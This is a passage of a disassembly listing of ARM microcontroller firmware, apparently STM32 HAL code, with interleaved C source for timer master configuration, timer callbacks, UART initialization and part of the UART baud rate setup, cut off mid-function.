 8005610:	687b      	ldr	r3, [r7, #4]
 8005612:	681b      	ldr	r3, [r3, #0]
 8005614:	4a21      	ldr	r2, [pc, #132]	; (800569c <HAL_TIMEx_MasterConfigSynchronization+0xc4>)
 8005616:	4293      	cmp	r3, r2
 8005618:	d108      	bne.n	800562c <HAL_TIMEx_MasterConfigSynchronization+0x54>
  {
    /* Check the parameters */
    assert_param(IS_TIM_TRGO2_SOURCE(sMasterConfig->MasterOutputTrigger2));

    /* Clear the MMS2 bits */
    tmpcr2 &= ~TIM_CR2_MMS2;
 800561a:	68fb      	ldr	r3, [r7, #12]
 800561c:	f423 0370 	bic.w	r3, r3, #15728640	; 0xf00000
 8005620:	60fb      	str	r3, [r7, #12]
    /* Select the TRGO2 source*/
    tmpcr2 |= sMasterConfig->MasterOutputTrigger2;
 8005622:	683b      	ldr	r3, [r7, #0]
 8005624:	685b      	ldr	r3, [r3, #4]
 8005626:	68fa      	ldr	r2, [r7, #12]
 8005628:	4313      	orrs	r3, r2
 800562a:	60fb      	str	r3, [r7, #12]
  }

  /* Reset the MMS Bits */
  tmpcr2 &= ~TIM_CR2_MMS;
 800562c:	68fb      	ldr	r3, [r7, #12]
 800562e:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8005632:	60fb      	str	r3, [r7, #12]
  /* Select the TRGO source */
  tmpcr2 |=  sMasterConfig->MasterOutputTrigger;
 8005634:	683b      	ldr	r3, [r7, #0]
 8005636:	681b      	ldr	r3, [r3, #0]
 8005638:	68fa      	ldr	r2, [r7, #12]
 800563a:	4313      	orrs	r3, r2
 800563c:	60fb      	str	r3, [r7, #12]

  /* Update TIMx CR2 */
  htim->Instance->CR2 = tmpcr2;
 800563e:	687b      	ldr	r3, [r7, #4]
 8005640:	681b      	ldr	r3, [r3, #0]
 8005642:	68fa      	ldr	r2, [r7, #12]
 8005644:	605a      	str	r2, [r3, #4]

  if (IS_TIM_SLAVE_INSTANCE(htim->Instance))
 8005646:	687b      	ldr	r3, [r7, #4]
 8005648:	681b      	ldr	r3, [r3, #0]
 800564a:	4a14      	ldr	r2, [pc, #80]	; (800569c <HAL_TIMEx_MasterConfigSynchronization+0xc4>)
 800564c:	4293      	cmp	r3, r2
 800564e:	d009      	beq.n	8005664 <HAL_TIMEx_MasterConfigSynchronization+0x8c>
 8005650:	687b      	ldr	r3, [r7, #4]
 8005652:	681b      	ldr	r3, [r3, #0]
 8005654:	f1b3 4f80 	cmp.w	r3, #1073741824	; 0x40000000
 8005658:	d004      	beq.n	8005664 <HAL_TIMEx_MasterConfigSynchronization+0x8c>
 800565a:	687b      	ldr	r3, [r7, #4]
 800565c:	681b      	ldr	r3, [r3, #0]
 800565e:	4a10      	ldr	r2, [pc, #64]	; (80056a0 <HAL_TIMEx_MasterConfigSynchronization+0xc8>)
 8005660:	4293      	cmp	r3, r2
 8005662:	d10c      	bne.n	800567e <HAL_TIMEx_MasterConfigSynchronization+0xa6>
  {
    /* Reset the MSM Bit */
    tmpsmcr &= ~TIM_SMCR_MSM;
 8005664:	68bb      	ldr	r3, [r7, #8]
 8005666:	f023 0380 	bic.w	r3, r3, #128	; 0x80
 800566a:	60bb      	str	r3, [r7, #8]
    /* Set master mode */
    tmpsmcr |= sMasterConfig->MasterSlaveMode;
 800566c:	683b      	ldr	r3, [r7, #0]
 800566e:	689b      	ldr	r3, [r3, #8]
 8005670:	68ba      	ldr	r2, [r7, #8]
 8005672:	4313      	orrs	r3, r2
 8005674:	60bb      	str	r3, [r7, #8]

    /* Update TIMx SMCR */
    htim->Instance->SMCR = tmpsmcr;
 8005676:	687b      	ldr	r3, [r7, #4]
 8005678:	681b      	ldr	r3, [r3, #0]
 800567a:	68ba      	ldr	r2, [r7, #8]
 800567c:	609a      	str	r2, [r3, #8]
  }

  /* Change the htim state */
  htim->State = HAL_TIM_STATE_READY;
 800567e:	687b      	ldr	r3, [r7, #4]
 8005680:	2201      	movs	r2, #1
 8005682:	f883 203d 	strb.w	r2, [r3, #61]	; 0x3d

  __HAL_UNLOCK(htim);
 8005686:	687b      	ldr	r3, [r7, #4]
 8005688:	2200      	movs	r2, #0
 800568a:	f883 203c 	strb.w	r2, [r3, #60]	; 0x3c

  return HAL_OK;
 800568e:	2300      	movs	r3, #0
}
 8005690:	4618      	mov	r0, r3
 8005692:	3714      	adds	r7, #20
 8005694:	46bd      	mov	sp, r7
 8005696:	f85d 7b04 	ldr.w	r7, [sp], #4
 800569a:	4770      	bx	lr
 800569c:	40012c00 	.word	0x40012c00
 80056a0:	40014000 	.word	0x40014000

080056a4 <HAL_TIMEx_CommutCallback>:
  * @brief  Hall commutation changed callback in non-blocking mode
  * @param  htim TIM handle
  * @retval None
  */
__weak void HAL_TIMEx_CommutCallback(TIM_HandleTypeDef *htim)
{
 80056a4:	b480      	push	{r7}
 80056a6:	b083      	sub	sp, #12
 80056a8:	af00      	add	r7, sp, #0
 80056aa:	6078      	str	r0, [r7, #4]
  UNUSED(htim);

  /* NOTE : This function should not be modified, when the callback is needed,
            the HAL_TIMEx_CommutCallback could be implemented in the user file
   */
}
 80056ac:	bf00      	nop
 80056ae:	370c      	adds	r7, #12
 80056b0:	46bd      	mov	sp, r7
 80056b2:	f85d 7b04 	ldr.w	r7, [sp], #4
 80056b6:	4770      	bx	lr

080056b8 <HAL_TIMEx_BreakCallback>:
  * @brief  Hall Break detection callback in non-blocking mode
  * @param  htim TIM handle
  * @retval None
  */
__weak void HAL_TIMEx_BreakCallback(TIM_HandleTypeDef *htim)
{
 80056b8:	b480      	push	{r7}
 80056ba:	b083      	sub	sp, #12
 80056bc:	af00      	add	r7, sp, #0
 80056be:	6078      	str	r0, [r7, #4]
  UNUSED(htim);

  /* NOTE : This function should not be modified, when the callback is needed,
            the HAL_TIMEx_BreakCallback could be implemented in the user file
   */
}
 80056c0:	bf00      	nop
 80056c2:	370c      	adds	r7, #12
 80056c4:	46bd      	mov	sp, r7
 80056c6:	f85d 7b04 	ldr.w	r7, [sp], #4
 80056ca:	4770      	bx	lr

080056cc <HAL_TIMEx_Break2Callback>:
  * @brief  Hall Break2 detection callback in non blocking mode
  * @param  htim: TIM handle
  * @retval None
  */
__weak void HAL_TIMEx_Break2Callback(TIM_HandleTypeDef *htim)
{
 80056cc:	b480      	push	{r7}
 80056ce:	b083      	sub	sp, #12
 80056d0:	af00      	add	r7, sp, #0
 80056d2:	6078      	str	r0, [r7, #4]
  UNUSED(htim);

  /* NOTE : This function Should not be modified, when the callback is needed,
            the HAL_TIMEx_Break2Callback could be implemented in the user file
   */
}
 80056d4:	bf00      	nop
 80056d6:	370c      	adds	r7, #12
 80056d8:	46bd      	mov	sp, r7
 80056da:	f85d 7b04 	ldr.w	r7, [sp], #4
 80056de:	4770      	bx	lr

080056e0 <HAL_UART_Init>:
  *        parameters in the UART_InitTypeDef and initialize the associated handle.
  * @param huart UART handle.
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_UART_Init(UART_HandleTypeDef *huart)
{
 80056e0:	b580      	push	{r7, lr}
 80056e2:	b082      	sub	sp, #8
 80056e4:	af00      	add	r7, sp, #0
 80056e6:	6078      	str	r0, [r7, #4]
  /* Check the UART handle allocation */
  if (huart == NULL)
 80056e8:	687b      	ldr	r3, [r7, #4]
 80056ea:	2b00      	cmp	r3, #0
 80056ec:	d101      	bne.n	80056f2 <HAL_UART_Init+0x12>
  {
    return HAL_ERROR;
 80056ee:	2301      	movs	r3, #1
 80056f0:	e040      	b.n	8005774 <HAL_UART_Init+0x94>
  {
    /* Check the parameters */
    assert_param((IS_UART_INSTANCE(huart->Instance)) || (IS_LPUART_INSTANCE(huart->Instance)));
  }

  if (huart->gState == HAL_UART_STATE_RESET)
 80056f2:	687b      	ldr	r3, [r7, #4]
 80056f4:	6fdb      	ldr	r3, [r3, #124]	; 0x7c
 80056f6:	2b00      	cmp	r3, #0
 80056f8:	d106      	bne.n	8005708 <HAL_UART_Init+0x28>
  {
    /* Allocate lock resource and initialize it */
    huart->Lock = HAL_UNLOCKED;
 80056fa:	687b      	ldr	r3, [r7, #4]
 80056fc:	2200      	movs	r2, #0
 80056fe:	f883 2078 	strb.w	r2, [r3, #120]	; 0x78

    /* Init the low level hardware */
    huart->MspInitCallback(huart);
#else
    /* Init the low level hardware : GPIO, CLOCK */
    HAL_UART_MspInit(huart);
 8005702:	6878      	ldr	r0, [r7, #4]
 8005704:	f7fb fd78 	bl	80011f8 <HAL_UART_MspInit>
#endif /* (USE_HAL_UART_REGISTER_CALLBACKS) */
  }

  huart->gState = HAL_UART_STATE_BUSY;
 8005708:	687b      	ldr	r3, [r7, #4]
 800570a:	2224      	movs	r2, #36	; 0x24
 800570c:	67da      	str	r2, [r3, #124]	; 0x7c

  __HAL_UART_DISABLE(huart);
 800570e:	687b      	ldr	r3, [r7, #4]
 8005710:	681b      	ldr	r3, [r3, #0]
 8005712:	681a      	ldr	r2, [r3, #0]
 8005714:	687b      	ldr	r3, [r7, #4]
 8005716:	681b      	ldr	r3, [r3, #0]
 8005718:	f022 0201 	bic.w	r2, r2, #1
 800571c:	601a      	str	r2, [r3, #0]

  /* Perform advanced settings configuration */
  /* For some items, configuration requires to be done prior TE and RE bits are set */
  if (huart->AdvancedInit.AdvFeatureInit != UART_ADVFEATURE_NO_INIT)
 800571e:	687b      	ldr	r3, [r7, #4]
 8005720:	6a5b      	ldr	r3, [r3, #36]	; 0x24
 8005722:	2b00      	cmp	r3, #0
 8005724:	d002      	beq.n	800572c <HAL_UART_Init+0x4c>
  {
    UART_AdvFeatureConfig(huart);
 8005726:	6878      	ldr	r0, [r7, #4]
 8005728:	f000 fa54 	bl	8005bd4 <UART_AdvFeatureConfig>
  }

  /* Set the UART Communication parameters */
  if (UART_SetConfig(huart) == HAL_ERROR)
 800572c:	6878      	ldr	r0, [r7, #4]
 800572e:	f000 f825 	bl	800577c <UART_SetConfig>
 8005732:	4603      	mov	r3, r0
 8005734:	2b01      	cmp	r3, #1
 8005736:	d101      	bne.n	800573c <HAL_UART_Init+0x5c>
  {
    return HAL_ERROR;
 8005738:	2301      	movs	r3, #1
 800573a:	e01b      	b.n	8005774 <HAL_UART_Init+0x94>
  }

  /* In asynchronous mode, the following bits must be kept cleared:
  - LINEN and CLKEN bits in the USART_CR2 register,
  - SCEN, HDSEL and IREN  bits in the USART_CR3 register.*/
  CLEAR_BIT(huart->Instance->CR2, (USART_CR2_LINEN | USART_CR2_CLKEN));
 800573c:	687b      	ldr	r3, [r7, #4]
 800573e:	681b      	ldr	r3, [r3, #0]
 8005740:	685a      	ldr	r2, [r3, #4]
 8005742:	687b      	ldr	r3, [r7, #4]
 8005744:	681b      	ldr	r3, [r3, #0]
 8005746:	f422 4290 	bic.w	r2, r2, #18432	; 0x4800
 800574a:	605a      	str	r2, [r3, #4]
  CLEAR_BIT(huart->Instance->CR3, (USART_CR3_SCEN | USART_CR3_HDSEL | USART_CR3_IREN));
 800574c:	687b      	ldr	r3, [r7, #4]
 800574e:	681b      	ldr	r3, [r3, #0]
 8005750:	689a      	ldr	r2, [r3, #8]
 8005752:	687b      	ldr	r3, [r7, #4]
 8005754:	681b      	ldr	r3, [r3, #0]
 8005756:	f022 022a 	bic.w	r2, r2, #42	; 0x2a
 800575a:	609a      	str	r2, [r3, #8]

  __HAL_UART_ENABLE(huart);
 800575c:	687b      	ldr	r3, [r7, #4]
 800575e:	681b      	ldr	r3, [r3, #0]
 8005760:	681a      	ldr	r2, [r3, #0]
 8005762:	687b      	ldr	r3, [r7, #4]
 8005764:	681b      	ldr	r3, [r3, #0]
 8005766:	f042 0201 	orr.w	r2, r2, #1
 800576a:	601a      	str	r2, [r3, #0]

  /* TEACK and/or REACK to check before moving huart->gState and huart->RxState to Ready */
  return (UART_CheckIdleState(huart));
 800576c:	6878      	ldr	r0, [r7, #4]
 800576e:	f000 fad3 	bl	8005d18 <UART_CheckIdleState>
 8005772:	4603      	mov	r3, r0
}
 8005774:	4618      	mov	r0, r3
 8005776:	3708      	adds	r7, #8
 8005778:	46bd      	mov	sp, r7
 800577a:	bd80      	pop	{r7, pc}

0800577c <UART_SetConfig>:
  * @brief Configure the UART peripheral.
  * @param huart UART handle.
  * @retval HAL status
  */
HAL_StatusTypeDef UART_SetConfig(UART_HandleTypeDef *huart)
{
 800577c:	e92d 4fb0 	stmdb	sp!, {r4, r5, r7, r8, r9, sl, fp, lr}
 8005780:	b08a      	sub	sp, #40	; 0x28
 8005782:	af00      	add	r7, sp, #0
 8005784:	60f8      	str	r0, [r7, #12]
  uint32_t tmpreg;
  uint16_t brrtemp;
  UART_ClockSourceTypeDef clocksource;
  uint32_t usartdiv;
  HAL_StatusTypeDef ret               = HAL_OK;
 8005786:	2300      	movs	r3, #0
 8005788:	f887 3022 	strb.w	r3, [r7, #34]	; 0x22
  *  the UART Word Length, Parity, Mode and oversampling:
  *  set the M bits according to huart->Init.WordLength value
  *  set PCE and PS bits according to huart->Init.Parity value
  *  set TE and RE bits according to huart->Init.Mode value
  *  set OVER8 bit according to huart->Init.OverSampling value */
  tmpreg = (uint32_t)huart->Init.WordLength | huart->Init.Parity | huart->Init.Mode | huart->Init.OverSampling ;
 800578c:	68fb      	ldr	r3, [r7, #12]
 800578e:	689a      	ldr	r2, [r3, #8]
 8005790:	68fb      	ldr	r3, [r7, #12]
 8005792:	691b      	ldr	r3, [r3, #16]
 8005794:	431a      	orrs	r2, r3
 8005796:	68fb      	ldr	r3, [r7, #12]
 8005798:	695b      	ldr	r3, [r3, #20]
 800579a:	431a      	orrs	r2, r3
 800579c:	68fb      	ldr	r3, [r7, #12]
 800579e:	69db      	ldr	r3, [r3, #28]
 80057a0:	4313      	orrs	r3, r2
 80057a2:	627b      	str	r3, [r7, #36]	; 0x24
  MODIFY_REG(huart->Instance->CR1, USART_CR1_FIELDS, tmpreg);
 80057a4:	68fb      	ldr	r3, [r7, #12]
 80057a6:	681b      	ldr	r3, [r3, #0]
 80057a8:	681a      	ldr	r2, [r3, #0]
 80057aa:	4bb4      	ldr	r3, [pc, #720]	; (8005a7c <UART_SetConfig+0x300>)
 80057ac:	4013      	ands	r3, r2
 80057ae:	68fa      	ldr	r2, [r7, #12]
 80057b0:	6812      	ldr	r2, [r2, #0]
 80057b2:	6a79      	ldr	r1, [r7, #36]	; 0x24
 80057b4:	430b      	orrs	r3, r1
 80057b6:	6013      	str	r3, [r2, #0]

  /*-------------------------- USART CR2 Configuration -----------------------*/
  /* Configure the UART Stop Bits: Set STOP[13:12] bits according
  * to huart->Init.StopBits value */
  MODIFY_REG(huart->Instance->CR2, USART_CR2_STOP, huart->Init.StopBits);
 80057b8:	68fb      	ldr	r3, [r7, #12]
 80057ba:	681b      	ldr	r3, [r3, #0]
 80057bc:	685b      	ldr	r3, [r3, #4]
 80057be:	f423 5140 	bic.w	r1, r3, #12288	; 0x3000
 80057c2:	68fb      	ldr	r3, [r7, #12]
 80057c4:	68da      	ldr	r2, [r3, #12]
 80057c6:	68fb      	ldr	r3, [r7, #12]
 80057c8:	681b      	ldr	r3, [r3, #0]
 80057ca:	430a      	orrs	r2, r1
 80057cc:	605a      	str	r2, [r3, #4]
  /* Configure
  * - UART HardWare Flow Control: set CTSE and RTSE bits according
  *   to huart->Init.HwFlowCtl value
  * - one-bit sampling method versus three samples' majority rule according
  *   to huart->Init.OneBitSampling (not applicable to LPUART) */
  tmpreg = (uint32_t)huart->Init.HwFlowCtl;
 80057ce:	68fb      	ldr	r3, [r7, #12]
 80057d0:	699b      	ldr	r3, [r3, #24]
 80057d2:	627b      	str	r3, [r7, #36]	; 0x24

  if (!(UART_INSTANCE_LOWPOWER(huart)))
 80057d4:	68fb      	ldr	r3, [r7, #12]
 80057d6:	681b      	ldr	r3, [r3, #0]
 80057d8:	4aa9      	ldr	r2, [pc, #676]	; (8005a80 <UART_SetConfig+0x304>)
 80057da:	4293      	cmp	r3, r2
 80057dc:	d004      	beq.n	80057e8 <UART_SetConfig+0x6c>
  {
    tmpreg |= huart->Init.OneBitSampling;
 80057de:	68fb      	ldr	r3, [r7, #12]
 80057e0:	6a1b      	ldr	r3, [r3, #32]
 80057e2:	6a7a      	ldr	r2, [r7, #36]	; 0x24
 80057e4:	4313      	orrs	r3, r2
 80057e6:	627b      	str	r3, [r7, #36]	; 0x24
  }
  MODIFY_REG(huart->Instance->CR3, USART_CR3_FIELDS, tmpreg);
 80057e8:	68fb      	ldr	r3, [r7, #12]
 80057ea:	681b      	ldr	r3, [r3, #0]
 80057ec:	689b      	ldr	r3, [r3, #8]
 80057ee:	f423 6130 	bic.w	r1, r3, #2816	; 0xb00
 80057f2:	68fb      	ldr	r3, [r7, #12]
 80057f4:	681b      	ldr	r3, [r3, #0]
 80057f6:	6a7a      	ldr	r2, [r7, #36]	; 0x24
 80057f8:	430a      	orrs	r2, r1
 80057fa:	609a      	str	r2, [r3, #8]
  * - UART Clock Prescaler : set PRESCALER according to huart->Init.ClockPrescaler value */
  MODIFY_REG(huart->Instance->PRESC, USART_PRESC_PRESCALER, huart->Init.ClockPrescaler);
#endif /* USART_PRESC_PRESCALER */

  /*-------------------------- USART BRR Configuration -----------------------*/
  UART_GETCLOCKSOURCE(huart, clocksource);
 80057fc:	68fb      	ldr	r3, [r7, #12]
 80057fe:	681b      	ldr	r3, [r3, #0]
 8005800:	4aa0      	ldr	r2, [pc, #640]	; (8005a84 <UART_SetConfig+0x308>)
 8005802:	4293      	cmp	r3, r2
 8005804:	d126      	bne.n	8005854 <UART_SetConfig+0xd8>
 8005806:	4ba0      	ldr	r3, [pc, #640]	; (8005a88 <UART_SetConfig+0x30c>)
 8005808:	f8d3 3088 	ldr.w	r3, [r3, #136]	; 0x88
 800580c:	f003 0303 	and.w	r3, r3, #3
 8005810:	2b03      	cmp	r3, #3
 8005812:	d81b      	bhi.n	800584c <UART_SetConfig+0xd0>
 8005814:	a201      	add	r2, pc, #4	; (adr r2, 800581c <UART_SetConfig+0xa0>)
 8005816:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 800581a:	bf00      	nop
 800581c:	0800582d 	.word	0x0800582d
 8005820:	0800583d 	.word	0x0800583d
 8005824:	08005835 	.word	0x08005835
 8005828:	08005845 	.word	0x08005845
 800582c:	2301      	movs	r3, #1
 800582e:	f887 3023 	strb.w	r3, [r7, #35]	; 0x23
 8005832:	e080      	b.n	8005936 <UART_SetConfig+0x1ba>
 8005834:	2302      	movs	r3, #2
 8005836:	f887 3023 	strb.w	r3, [r7, #35]	; 0x23
 800583a:	e07c      	b.n	8005936 <UART_SetConfig+0x1ba>
 800583c:	2304      	movs	r3, #4
 800583e:	f887 3023 	strb.w	r3, [r7, #35]	; 0x23
 8005842:	e078      	b.n	8005936 <UART_SetConfig+0x1ba>
 8005844:	2308      	movs	r3, #8
 8005846:	f887 3023 	strb.w	r3, [r7, #35]	; 0x23
 800584a:	e074      	b.n	8005936 <UART_SetConfig+0x1ba>
 800584c:	2310      	movs	r3, #16
 800584e:	f887 3023 	strb.w	r3, [r7, #35]	; 0x23
 8005852:	e070      	b.n	8005936 <UART_SetConfig+0x1ba>
 8005854:	68fb      	ldr	r3, [r7, #12]
 8005856:	681b      	ldr	r3, [r3, #0]
 8005858:	4a8c      	ldr	r2, [pc, #560]	; (8005a8c <UART_SetConfig+0x310>)
 800585a:	4293      	cmp	r3, r2
 800585c:	d138      	bne.n	80058d0 <UART_SetConfig+0x154>
 800585e:	4b8a      	ldr	r3, [pc, #552]	; (8005a88 <UART_SetConfig+0x30c>)
 8005860:	f8d3 3088 	ldr.w	r3, [r3, #136]	; 0x88
 8005864:	f003 030c 	and.w	r3, r3, #12
 8005868:	2b0c      	cmp	r3, #12
 800586a:	d82d      	bhi.n	80058c8 <UART_SetConfig+0x14c>
 800586c:	a201      	add	r2, pc, #4	; (adr r2, 8005874 <UART_SetConfig+0xf8>)
 800586e:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 8005872:	bf00      	nop
 8005874:	080058a9 	.word	0x080058a9
 8005878:	080058c9 	.word	0x080058c9
 800587c:	080058c9 	.word	0x080058c9
 8005880:	080058c9 	.word	0x080058c9
 8005884:	080058b9 	.word	0x080058b9
 8005888:	080058c9 	.word	0x080058c9
 800588c:	080058c9 	.word	0x080058c9
 8005890:	080058c9 	.word	0x080058c9
 8005894:	080058b1 	.word	0x080058b1
 8005898:	080058c9 	.word	0x080058c9
 800589c:	080058c9 	.word	0x080058c9
 80058a0:	080058c9 	.word	0x080058c9
 80058a4:	080058c1 	.word	0x080058c1
 80058a8:	2300      	movs	r3, #0
 80058aa:	f887 3023 	strb.w	r3, [r7, #35]	; 0x23
 80058ae:	e042      	b.n	8005936 <UART_SetConfig+0x1ba>
 80058b0:	2302      	movs	r3, #2
 80058b2:	f887 3023 	strb.w	r3, [r7, #35]	; 0x23
 80058b6:	e03e      	b.n	8005936 <UART_SetConfig+0x1ba>
 80058b8:	2304      	movs	r3, #4
 80058ba:	f887 3023 	strb.w	r3, [r7, #35]	; 0x23
 80058be:	e03a      	b.n	8005936 <UART_SetConfig+0x1ba>
 80058c0:	2308      	movs	r3, #8
 80058c2:	f887 3023 	strb.w	r3, [r7, #35]	; 0x23
 80058c6:	e036      	b.n	8005936 <UART_SetConfig+0x1ba>
 80058c8:	2310      	movs	r3, #16
 80058ca:	f887 3023 	strb.w	r3, [r7, #35]	; 0x23
 80058ce:	e032      	b.n	8005936 <UART_SetConfig+0x1ba>
 80058d0:	68fb      	ldr	r3, [r7, #12]
 80058d2:	681b      	ldr	r3, [r3, #0]
 80058d4:	4a6a      	ldr	r2, [pc, #424]	; (8005a80 <UART_SetConfig+0x304>)
 80058d6:	4293      	cmp	r3, r2
 80058d8:	d12a      	bne.n	8005930 <UART_SetConfig+0x1b4>
 80058da:	4b6b      	ldr	r3, [pc, #428]	; (8005a88 <UART_SetConfig+0x30c>)
 80058dc:	f8d3 3088 	ldr.w	r3, [r3, #136]	; 0x88
 80058e0:	f403 6340 	and.w	r3, r3, #3072	; 0xc00
 80058e4:	f5b3 6f40 	cmp.w	r3, #3072	; 0xc00
 80058e8:	d01a      	beq.n	8005920 <UART_SetConfig+0x1a4>
 80058ea:	f5b3 6f40 	cmp.w	r3, #3072	; 0xc00
 80058ee:	d81b      	bhi.n	8005928 <UART_SetConfig+0x1ac>
 80058f0:	f5b3 6f00 	cmp.w	r3, #2048	; 0x800
 80058f4:	d00c      	beq.n	8005910 <UART_SetConfig+0x194>
 80058f6:	f5b3 6f00 	cmp.w	r3, #2048	; 0x800
 80058fa:	d815      	bhi.n	8005928 <UART_SetConfig+0x1ac>
 80058fc:	2b00      	cmp	r3, #0
 80058fe:	d003      	beq.n	8005908 <UART_SetConfig+0x18c>
 8005900:	f5b3 6f80 	cmp.w	r3, #1024	; 0x400
 8005904:	d008      	beq.n	8005918 <UART_SetConfig+0x19c>
 8005906:	e00f      	b.n	8005928 <UART_SetConfig+0x1ac>
 8005908:	2300      	movs	r3, #0
 800590a:	f887 3023 	strb.w	r3, [r7, #35]	; 0x23
 800590e:	e012      	b.n	8005936 <UART_SetConfig+0x1ba>
 8005910:	2302      	movs	r3, #2
 8005912:	f887 3023 	strb.w	r3, [r7, #35]	; 0x23
 8005916:	e00e      	b.n	8005936 <UART_SetConfig+0x1ba>
 8005918:	2304      	movs	r3, #4
 800591a:	f887 3023 	strb.w	r3, [r7, #35]	; 0x23
 800591e:	e00a      	b.n	8005936 <UART_SetConfig+0x1ba>
 8005920:	2308      	movs	r3, #8
 8005922:	f887 3023 	strb.w	r3, [r7, #35]	; 0x23
 8005926:	e006      	b.n	8005936 <UART_SetConfig+0x1ba>
 8005928:	2310      	movs	r3, #16
 800592a:	f887 3023 	strb.w	r3, [r7, #35]	; 0x23
 800592e:	e002      	b.n	8005936 <UART_SetConfig+0x1ba>
 8005930:	2310      	movs	r3, #16
 8005932:	f887 3023 	strb.w	r3, [r7, #35]	; 0x23

  /* Check LPUART instance */
  if (UART_INSTANCE_LOWPOWER(huart))
 8005936:	68fb      	ldr	r3, [r7, #12]
 8005938:	681b      	ldr	r3, [r3, #0]
 800593a:	4a51      	ldr	r2, [pc, #324]	; (8005a80 <UART_SetConfig+0x304>)
 800593c:	4293      	cmp	r3, r2
 800593e:	d17a      	bne.n	8005a36 <UART_SetConfig+0x2ba>
  {
    /* Retrieve frequency clock */
    switch (clocksource)
 8005940:	f897 3023 	ldrb.w	r3, [r7, #35]	; 0x23
 8005944:	2b08      	cmp	r3, #8
 8005946:	d824      	bhi.n	8005992 <UART_SetConfig+0x216>
 8005948:	a201      	add	r2, pc, #4	; (adr r2, 8005950 <UART_SetConfig+0x1d4>)
 800594a:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 800594e:	bf00      	nop
 8005950:	08005975 	.word	0x08005975
 8005954:	08005993 	.word	0x08005993
 8005958:	0800597d 	.word	0x0800597d
 800595c:	08005993 	.word	0x08005993
 8005960:	08005983 	.word	0x08005983
 8005964:	08005993 	.word	0x08005993
 8005968:	08005993 	.word	0x08005993
 800596c:	08005993 	.word	0x08005993
 8005970:	0800598b 	.word	0x0800598b
    {
      case UART_CLOCKSOURCE_PCLK1:
        pclk = HAL_RCC_GetPCLK1Freq();
 8005974:	f7fe fe6c 	bl	8004650 <HAL_RCC_GetPCLK1Freq>
 8005978:	61f8      	str	r0, [r7, #28]
        break;
 800597a:	e010      	b.n	800599e <UART_SetConfig+0x222>
      case UART_CLOCKSOURCE_HSI:
        pclk = (uint32_t) HSI_VALUE;
 800597c:	4b44      	ldr	r3, [pc, #272]	; (8005a90 <UART_SetConfig+0x314>)
 800597e:	61fb      	str	r3, [r7, #28]
        break;
 8005980:	e00d      	b.n	800599e <UART_SetConfig+0x222>
      case UART_CLOCKSOURCE_SYSCLK:
        pclk = HAL_RCC_GetSysClockFreq();
 8005982:	f7fe fdcd 	bl	8004520 <HAL_RCC_GetSysClockFreq>
 8005986:	61f8      	str	r0, [r7, #28]
        break;
 8005988:	e009      	b.n	800599e <UART_SetConfig+0x222>
      case UART_CLOCKSOURCE_LSE:
        pclk = (uint32_t) LSE_VALUE;
 800598a:	f44f 4300 	mov.w	r3, #32768	; 0x8000
 800598e:	61fb      	str	r3, [r7, #28]
        break;
 8005990:	e005      	b.n	800599e <UART_SetConfig+0x222>
      default:
        pclk = 0U;
 8005992:	2300      	movs	r3, #0
 8005994:	61fb      	str	r3, [r7, #28]
        ret = HAL_ERROR;
 8005996:	2301      	movs	r3, #1
 8005998:	f887 3022 	strb.w	r3, [r7, #34]	; 0x22
        break;
 800599c:	bf00      	nop
    }

    /* If proper clock source reported */
    if (pclk != 0U)
 800599e:	69fb      	ldr	r3, [r7, #28]
 80059a0:	2b00      	cmp	r3, #0
 80059a2:	f000 8107 	beq.w	8005bb4 <UART_SetConfig+0x438>
      } /* if ( (lpuart_ker_ck_pres < (3 * huart->Init.BaudRate) ) ||
                (lpuart_ker_ck_pres > (4096 * huart->Init.BaudRate) )) */
#else
      /* No Prescaler applicable */
      /* Ensure that Frequency clock is in the range [3 * baudrate, 4096 * baudrate] */
      if ((pclk < (3U * huart->Init.BaudRate)) ||
 80059a6:	68fb      	ldr	r3, [r7, #12]
 80059a8:	685a      	ldr	r2, [r3, #4]
 80059aa:	4613      	mov	r3, r2
 80059ac:	005b      	lsls	r3, r3, #1
 80059ae:	4413      	add	r3, r2
 80059b0:	69fa      	ldr	r2, [r7, #28]
 80059b2:	429a      	cmp	r2, r3
 80059b4:	d305      	bcc.n	80059c2 <UART_SetConfig+0x246>
          (pclk > (4096U * huart->Init.BaudRate)))
 80059b6:	68fb      	ldr	r3, [r7, #12]
 80059b8:	685b      	ldr	r3, [r3, #4]
 80059ba:	031b      	lsls	r3, r3, #12
      if ((pclk < (3U * huart->Init.BaudRate)) ||
 80059bc:	69fa      	ldr	r2, [r7, #28]
 80059be:	429a      	cmp	r2, r3
 80059c0:	d903      	bls.n	80059ca <UART_SetConfig+0x24e>
      {
        ret = HAL_ERROR;
 80059c2:	2301      	movs	r3, #1
 80059c4:	f887 3022 	strb.w	r3, [r7, #34]	; 0x22
 80059c8:	e0f4      	b.n	8005bb4 <UART_SetConfig+0x438>
      }
      else
      {
        usartdiv = (uint32_t)(UART_DIV_LPUART(pclk, huart->Init.BaudRate));
 80059ca:	69fb      	ldr	r3, [r7, #28]
 80059cc:	2200      	movs	r2, #0
 80059ce:	461c      	mov	r4, r3
 80059d0:	4615      	mov	r5, r2
 80059d2:	f04f 0200 	mov.w	r2, #0
 80059d6:	f04f 0300 	mov.w	r3, #0
 80059da:	022b      	lsls	r3, r5, #8
 80059dc:	ea43 6314 	orr.w	r3, r3, r4, lsr #24
 80059e0:	0222      	lsls	r2, r4, #8
 80059e2:	68f9      	ldr	r1, [r7, #12]
 80059e4:	6849      	ldr	r1, [r1, #4]
 80059e6:	0849      	lsrs	r1, r1, #1
 80059e8:	2000      	movs	r0, #0
 80059ea:	4688      	mov	r8, r1
 80059ec:	4681      	mov	r9, r0
 80059ee:	eb12 0a08 	adds.w	sl, r2, r8
 80059f2:	eb43 0b09 	adc.w	fp, r3, r9
 80059f6:	68fb      	ldr	r3, [r7, #12]
 80059f8:	685b      	ldr	r3, [r3, #4]
 80059fa:	2200      	movs	r2, #0
 80059fc:	603b      	str	r3, [r7, #0]
 80059fe:	607a      	str	r2, [r7, #4]
 8005a00:	e9d7 2300 	ldrd	r2, r3, [r7]
 8005a04:	4650      	mov	r0, sl
 8005a06:	4659      	mov	r1, fp
 8005a08:	f7fa fbe8 	bl	80001dc <__aeabi_uldivmod>
 8005a0c:	4602      	mov	r2, r0
 8005a0e:	460b      	mov	r3, r1
 8005a10:	4613      	mov	r3, r2
 8005a12:	61bb      	str	r3, [r7, #24]
